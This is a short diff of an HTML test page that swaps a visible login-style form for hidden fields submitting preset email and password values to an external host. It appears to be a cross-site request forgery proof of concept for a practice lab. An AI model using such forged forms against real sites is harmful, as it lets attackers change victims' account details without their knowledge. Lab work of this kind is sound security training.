@@ -1,6 +1,9 @@
 <html>
 <body>
   <h1> TEST </h1>
-  <form action="https://csrf1.vulns101.ar7z1.com/" method="POST" autocomplete="off"><div class="card"><input class="form-control form-control-lg" type="text"  id="email" name="123"/><input class="form-control form-control-lg form-control-last" type="password"  id="password" name="456"/></div><p><button class="btn btn-dark btn-block mt-3" type="submit">Save</button></p></form>
+  <form  method="POST" action="https://csrf1.vulns101.ar7z1.com/">
+    <input type="hidden" name="email" value="123"/>
+    <input type="hidden" name="password" value="456"/>
+  </form>
   </body>
 </html>
